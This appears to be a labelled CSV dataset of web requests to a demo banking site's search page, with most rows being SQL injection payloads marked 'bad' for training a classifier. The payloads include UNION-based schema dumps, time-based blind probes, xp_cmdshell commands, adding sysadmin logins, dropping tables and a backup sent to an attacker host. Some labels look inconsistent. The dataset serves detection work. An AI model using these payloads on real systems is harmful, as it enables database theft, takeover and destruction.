path,content,host,class_flag
/search.jsp?query=admin'or 1=1 or ''=',,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1#,,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1/*,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1'/*,,demo.testfire.net,['bad']
"/search.jsp?query=1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" --",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" #",,demo.testfire.net,['good']
"/search.jsp?query=admin""/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin""or 1=1 or """"=""",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1#",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query=1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
/search.jsp?query===,,demo.testfire.net,['good']
/search.jsp?query==,,demo.testfire.net,['good']
/search.jsp?query=',,demo.testfire.net,['good']
/search.jsp?query=' --,,demo.testfire.net,['bad']
/search.jsp?query=' #,,demo.testfire.net,['good']
/search.jsp?query=' ,,demo.testfire.net,['good']
/search.jsp?query='--,,demo.testfire.net,['bad']
/search.jsp?query='/*,,demo.testfire.net,['bad']
/search.jsp?query='#,,demo.testfire.net,['good']
"/search.jsp?query="" --",,demo.testfire.net,['bad']
"/search.jsp?query="" #",,demo.testfire.net,['good']
"/search.jsp?query=""/*",,demo.testfire.net,['bad']
/search.jsp?query=' and 1='1,,demo.testfire.net,['bad']
/search.jsp?query=' and a='a,,demo.testfire.net,['bad']
/search.jsp?query= or true,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=' or ''=',,demo.testfire.net,['bad']
"/search.jsp?query="" or """"=""",,demo.testfire.net,['bad']
/search.jsp?query=12) and '12='1,,demo.testfire.net,['bad']
"/search.jsp?query=' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
"/search.jsp?query="" AND 1=0 UNION ALL SELECT """", ""81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
/search.jsp?query= and 1=1,,demo.testfire.net,['bad']
/search.jsp?query= and 1=1,,demo.testfire.net,['bad']
/search.jsp?query=' and 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' and 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' group by password having 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' group by userid having 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' group by username having 1=1--,,demo.testfire.net,['bad']
/search.jsp?query= like '%',,demo.testfire.net,['bad']
/search.jsp?query= or 0=0 --,,demo.testfire.net,['bad']
/search.jsp?query= or 0=0 #,,demo.testfire.net,['bad']
/search.jsp?query= or 0=0 ,,demo.testfire.net,['bad']
/search.jsp?query=' or         0=0 #,,demo.testfire.net,['bad']
/search.jsp?query=' or 0=0 --,,demo.testfire.net,['bad']
/search.jsp?query=' or 0=0 #,,demo.testfire.net,['bad']
/search.jsp?query=' or 0=0 ,,demo.testfire.net,['bad']
"/search.jsp?query="" or 0=0 --",,demo.testfire.net,['bad']
"/search.jsp?query="" or 0=0 ",,demo.testfire.net,['bad']
"/search.jsp?query="" or 0=0 #",,demo.testfire.net,['bad']
/search.jsp?query=%' or '0'='0,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1/*,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1#,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=' or '12='1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 --,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 ,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1;#,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1/*,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1#,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1--,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1--,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query='or'1=1,,demo.testfire.net,['bad']
/search.jsp?query='or'1=12,,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1 --",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1 ",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1--",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1/*",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1#",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1""#",,demo.testfire.net,['bad']
/search.jsp?query=) or '12='1,,demo.testfire.net,['bad']
/search.jsp?query=) or ('12='1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 LIMIT 1;#,,demo.testfire.net,['bad']
/search.jsp?query='or 1=1 or ''=',,demo.testfire.net,['bad']
"/search.jsp?query=""or 1=1 or """"=""",,demo.testfire.net,['bad']
/search.jsp?query=' or 'a'='a,,demo.testfire.net,['bad']
/search.jsp?query=' or a=a--,,demo.testfire.net,['bad']
/search.jsp?query=' or a=a,,demo.testfire.net,['bad']
/search.jsp?query=') or ('a'='a,,demo.testfire.net,['bad']
"/search.jsp?query="" or ""a""=""a",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""a""=""a",,demo.testfire.net,['bad']
"/search.jsp?query=') or ('a'='a and hi"") or (""a""=""a",,demo.testfire.net,['bad']
/search.jsp?query=' or 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' or 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' or uid like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or uname like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or userid like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or user like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or username like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or 'x'='x,,demo.testfire.net,['bad']
/search.jsp?query=') or ('x'='x,,demo.testfire.net,['bad']
"/search.jsp?query="" or ""x""=""x",,demo.testfire.net,['bad']
/search.jsp?query=' OR 'x'='x'#;,,demo.testfire.net,['bad']
/search.jsp?query='=' 'or' and '=' 'or',,demo.testfire.net,['bad']
"/search.jsp?query=' UNION ALL SELECT 1, @@version;#",,demo.testfire.net,['bad']
"/search.jsp?query=' UNION ALL SELECT system_user(),user();#",,demo.testfire.net,['bad']
"/search.jsp?query=' UNION select table_schema,table_name FROM information_Schema.tables;#",,demo.testfire.net,['bad']
"/search.jsp?query=admin' and substring(password/text(),1,1)='7",,demo.testfire.net,['bad']
"/search.jsp?query=' and substring(password/text(),1,1)='7",,demo.testfire.net,['bad']
/search.jsp?query=select @@version,,demo.testfire.net,['bad']
/search.jsp?query=select @@servernamee,,demo.testfire.net,['bad']
/search.jsp?query=select @@microsoftversione,,demo.testfire.net,['bad']
/search.jsp?query=select * from master..sysserverse,,demo.testfire.net,['bad']
/search.jsp?query=select * from sysusers,,demo.testfire.net,['bad']
/search.jsp?query=exec master..xp_cmdshell 'ipconfig+/all',,demo.testfire.net,['bad']
/search.jsp?query=exec master..xp_cmdshell 'net+users',,demo.testfire.net,['bad']
/search.jsp?query=exec master..xp_cmdshell 'net+view',,demo.testfire.net,['bad']
/search.jsp?query=exec master..xp_cmdshell 'ping+<attackerip>',,demo.testfire.net,['bad']
/search.jsp?query=BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat',,demo.testfire.net,['bad']
/search.jsp?query=# you will need to customize/modify some of the vaules in the queries for best effect,,demo.testfire.net,['bad']
/search.jsp?query='; exec master..xp_cmdshell 'ping 10.10.1.2'--,,demo.testfire.net,['bad']
/search.jsp?query='create user name identified by 'pass123' --,,demo.testfire.net,['bad']
/search.jsp?query='create user name identified by pass123 temporary tablespace temp default tablespace users; ,,demo.testfire.net,['bad']
"/search.jsp?query='exec sp_addlogin 'name' , 'password' --",,demo.testfire.net,['bad']
"/search.jsp?query=' exec sp_addsrvrolemember 'name' , 'sysadmin' --",,demo.testfire.net,['bad']
"/search.jsp?query=' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --",,demo.testfire.net,['bad']
/search.jsp?query=' ; drop table temp --,,demo.testfire.net,['bad']
/search.jsp?query=' grant connect to name; grant resource to name; --,,demo.testfire.net,['bad']
"/search.jsp?query=' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 --,,demo.testfire.net,['bad']
/search.jsp?query=' union (select @@version) --,,demo.testfire.net,['bad']
"/search.jsp?query=' union (select NULL, (select @@version)) --",,demo.testfire.net,['bad']
"/search.jsp?query=' union (select NULL, NULL, (select @@version)) --",,demo.testfire.net,['bad']
"/search.jsp?query=' union (select NULL, NULL, NULL,  (select @@version)) --",,demo.testfire.net,['bad']
"/search.jsp?query=' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",,demo.testfire.net,['bad']
"/search.jsp?query=' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",,demo.testfire.net,['bad']
/search.jsp?query=1'1,,demo.testfire.net,['good']
/search.jsp?query=1 exec sp_ (or exec xp_),,demo.testfire.net,['bad']
/search.jsp?query=1 and 1=1,,demo.testfire.net,['bad']
/search.jsp?query=1' and 1=(select count(*) from tablenames); --,,demo.testfire.net,['bad']
/search.jsp?query=1 or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=1' or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=,,demo.testfire.net,['good']
/search.jsp?query=) or ('x'='x,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=; execute immediate 'sel' || 'ect us' || 'er',,demo.testfire.net,['bad']
"/search.jsp?query=benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=update,,demo.testfire.net,['good']
"/search.jsp?query="";waitfor delay '0:0:__TIME__'--",,demo.testfire.net,['bad']
/search.jsp?query=1) or pg_sleep(__TIME__)--,,demo.testfire.net,['bad']
"/search.jsp?query=||(elt(-3+5,bin(15),ord(10),hex(char(45))))",,demo.testfire.net,['bad']
"/search.jsp?query=""hi"""") or (""""a""""=""""a""",,demo.testfire.net,['bad']
/search.jsp?query=delete,,demo.testfire.net,['bad']
/search.jsp?query=like,,demo.testfire.net,['bad']
"/search.jsp?query="" or sleep(__TIME__)#",,demo.testfire.net,['bad']
/search.jsp?query=pg_sleep(__TIME__)--,,demo.testfire.net,['bad']
/search.jsp?query=*(|(objectclass=*)),,demo.testfire.net,['bad']
/search.jsp?query=declare @q nvarchar (200) 0x730065006c00650063 ...,,demo.testfire.net,['bad']
/search.jsp?query= or 0=0 #,,demo.testfire.net,['bad']
/search.jsp?query=insert,,demo.testfire.net,['bad']
/search.jsp?query=1) or sleep(__TIME__)#,,demo.testfire.net,['bad']
/search.jsp?query=) or ('a'='a,,demo.testfire.net,['bad']
/search.jsp?query=; exec xp_regread,,demo.testfire.net,['bad']
/search.jsp?query=*|,,demo.testfire.net,['bad']
/search.jsp?query=@var select @var as var into temp end --,,demo.testfire.net,['bad']
"/search.jsp?query=1)) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=asc,,demo.testfire.net,['good']
/search.jsp?query=(||6),,demo.testfire.net,['bad']
"/search.jsp?query=""a"""" or 3=3--""",,demo.testfire.net,['bad']
"/search.jsp?query="" or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=# from wapiti,,demo.testfire.net,['bad']
/search.jsp?query= or 0=0 --,,demo.testfire.net,['bad']
/search.jsp?query=1 waitfor delay '0:0:10'--,,demo.testfire.net,['bad']
/search.jsp?query= or 'a'='a,,demo.testfire.net,['bad']
"/search.jsp?query=hi or 1=1 --""",,demo.testfire.net,['bad']
/search.jsp?query=or a = a,,demo.testfire.net,['bad']
/search.jsp?query= UNION ALL SELECT,,demo.testfire.net,['bad']
/search.jsp?query=) or sleep(__TIME__)=',,demo.testfire.net,['bad']
"/search.jsp?query=)) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=hi' or 'a'='a,,demo.testfire.net,['bad']
/search.jsp?query=21 %,,demo.testfire.net,['good']
/search.jsp?query=0,,demo.testfire.net,['good']
/search.jsp?query=limit,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1,,demo.testfire.net,['bad']
/search.jsp?query= or 2 > 1,,demo.testfire.net,['bad']
"/search.jsp?query="")) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=PRINT,,demo.testfire.net,['bad']
/search.jsp?query=hi') or ('a'='a,,demo.testfire.net,['bad']
/search.jsp?query= or 3=3,,demo.testfire.net,['bad']
/search.jsp?query=));waitfor delay '0:0:__TIME__'--,,demo.testfire.net,['bad']
/search.jsp?query=a' waitfor delay '0:0:10'--,,demo.testfire.net,['bad']
"/search.jsp?query=1;(load_file(char(47,101,116,99,47,112,97,115, ...",,demo.testfire.net,['bad']
/search.jsp?query=1 or sleep(__TIME__)#,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1,,demo.testfire.net,['bad']
/search.jsp?query= and 1 in (select var from temp)--,,demo.testfire.net,['bad']
/search.jsp?query= or '7659'='7659,,demo.testfire.net,['bad']
/search.jsp?query= or 'text' = n'text',,demo.testfire.net,['bad']
/search.jsp?query= --,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1 or ''=',,demo.testfire.net,['bad']
/search.jsp?query=declare @s varchar (200) select @s = 0x73656c6 ...,,demo.testfire.net,['bad']
/search.jsp?query=exec xp,,demo.testfire.net,['bad']
/search.jsp?query=; exec master..xp_cmdshell 'ping 172.10.1.255'--,,demo.testfire.net,['bad']
"/search.jsp?query="" or pg_sleep(__TIME__)--",,demo.testfire.net,['bad']
/search.jsp?query=x' AND email IS NULL; --,,demo.testfire.net,['bad']
/search.jsp?query=&,,demo.testfire.net,['good']
/search.jsp?query=admin' or ',,demo.testfire.net,['bad']
/search.jsp?query= or 'unusual' = 'unusual',,demo.testfire.net,['bad']
/search.jsp?query=3.10E+17,,demo.testfire.net,['good']
/search.jsp?query=//,,demo.testfire.net,['good']
/search.jsp?query=truncate,,demo.testfire.net,['good']
"/search.jsp?query=1) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=declare @s varchar(200) select @s = 0x77616974 ...,,demo.testfire.net,['bad']
/search.jsp?query=\x27UNION SELECT,,demo.testfire.net,['bad']
/search.jsp?query=tz_offset,,demo.testfire.net,['good']
/search.jsp?query=sqlvuln,,demo.testfire.net,['bad']
"/search.jsp?query=""));waitfor delay '0:0:__TIME__'--",,demo.testfire.net,['bad']
/search.jsp?query=||6,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1 --,,demo.testfire.net,['bad']
/search.jsp?query=*(|(objectclass=*)),,demo.testfire.net,['bad']
/search.jsp?query=) union select * from information_schema.tables;,,demo.testfire.net,['bad']
/search.jsp?query=or a=a,,demo.testfire.net,['bad']
/search.jsp?query=PRINT @@variable,,demo.testfire.net,['bad']
/search.jsp?query=or isNULL(1/0) /*,,demo.testfire.net,['bad']
/search.jsp?query=26 %,,demo.testfire.net,['good']
"/search.jsp?query="" or ""a""=""a",,demo.testfire.net,['bad']
/search.jsp?query=(sqlvuln),,demo.testfire.net,['bad']
/search.jsp?query=x' AND members.email IS NULL; --,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=0x770061006900740066006F0072002000640065006C00 ...,,demo.testfire.net,['good']
"/search.jsp?query= and 1=( if((load_file(char(110,46,101,120,11 ...",,demo.testfire.net,['bad']
/search.jsp?query= 'sleep 50',,demo.testfire.net,['bad']
/search.jsp?query=as,,demo.testfire.net,['good']
/search.jsp?query=1)) or pg_sleep(__TIME__)--,,demo.testfire.net,['bad']
/search.jsp?query=/**/or/**/1/**/=/**/1,,demo.testfire.net,['bad']
/search.jsp?query= union all select @@version--,,demo.testfire.net,['bad']
"/search.jsp?query=,@variable",,demo.testfire.net,['bad']
/search.jsp?query=(sqlattempt2),,demo.testfire.net,['bad']
/search.jsp?query= or (EXISTS),,demo.testfire.net,['bad']
/search.jsp?query=t'exec master..xp_cmdshell 'nslookup www.googl ...,,demo.testfire.net,['bad']
/search.jsp?query= $(sleep 50),,demo.testfire.net,['bad']
"/search.jsp?query=1 or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query= or ''=',,demo.testfire.net,['bad']
/search.jsp?query=||UTL_HTTP.REQUEST,,demo.testfire.net,['bad']
/search.jsp?query= or pg_sleep(__TIME__)--,,demo.testfire.net,['bad']
